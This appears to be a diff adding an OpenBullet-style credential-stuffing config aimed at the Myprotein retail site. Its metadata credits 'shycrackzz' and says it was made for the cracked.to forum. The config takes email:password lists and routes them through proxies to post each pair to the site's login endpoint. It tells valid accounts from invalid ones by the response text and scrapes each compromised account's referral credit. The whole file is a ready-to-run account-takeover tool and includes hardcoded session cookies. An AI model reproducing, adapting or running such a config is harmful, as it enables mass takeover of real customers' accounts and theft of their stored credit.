@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "myprotein",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-06T14:12:05.6176201+01:00",
+  "AdditionalInfo": "made for cracked.to",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "shycrackzz",
+  "Version": "1.2.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.myprotein.com/elysiumAuthentication.login" 
+  CONTENT "elysium_username=<USER>&elysium_password=<PASS>&returnTo=https%3A%2F%2Fwww.myprotein.com%2FaccountHome.account&csrf_token=18065342144690027364" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Cookie: JSESSIONID=6CB3E6837A76A5FC7F42723D65A52D32; chumewe_user=967a4be0-fe0e-4fa3-bb7e-96295c6eec85; chumewe_sess=dbcaa629-f959-46e3-a005-baf43f42e914; locale_V6=en_GB; csrf_token=18065342144690027364; NSC_mc_wtsw_efgbvmu_xfctsw_81_G=ffffffff09031f3545525d5f4f58455e445a4a423661; affil_V6=mpppc; _gcl_aw=GCL.1554554935.Cj0KCQjwnKHlBRDLARIsAMtMHDFvvC76yU6uOLPgfrQpwvtI2GhctbZkUO2mL8L1g-0887htjFKATXsaAu7sEALw_wcB; _gcl_dc=GCL.1554554935.Cj0KCQjwnKHlBRDLARIsAMtMHDFvvC76yU6uOLPgfrQpwvtI2GhctbZkUO2mL8L1g-0887htjFKATXsaAu7sEALw_wcB; _gcl_au=1.1.17635040.1554554935; gaVisitId=idj1vf6oi8wj; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.761230816.1554554936; _gid=GA1.2.1011727060.1554554936; _dc_gtm_UA-479953-1=1; _dc_gtm_UA-56952874-1=1; _gat_UA-479953-1=1; _gat_UA-56952874-1=1; cto_lwid=46a03894-916d-4075-a541-9a50e9e725da; en_chosenSubsite_V6=en; _fbp=fb.1.1554554936941.907106008; _gac_UA-56952874-1=1.1554554941.Cj0KCQjwnKHlBRDLARIsAMtMHDFvvC76yU6uOLPgfrQpwvtI2GhctbZkUO2mL8L1g-0887htjFKATXsaAu7sEALw_wcB; _gac_UA-479953-1=1.1554554941.Cj0KCQjwnKHlBRDLARIsAMtMHDFvvC76yU6uOLPgfrQpwvtI2GhctbZkUO2mL8L1g-0887htjFKATXsaAu7sEALw_wcB; _gali=login-submit; ADRUM=s=1554554952150&r=https%3A%2F%2Fwww.myprotein.com%2Flogin.jsp%3F1612054698" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The email address or password you entered were invalid" 
+  KEYCHAIN Success OR 
+    KEY ">My Account</p>" 
+
+PARSE "<SOURCE>" LR "<p class=\"referralsCard_stat\">" "</p>" -> CAP "Credit" "" " By SHYCRACKZZ" 
+
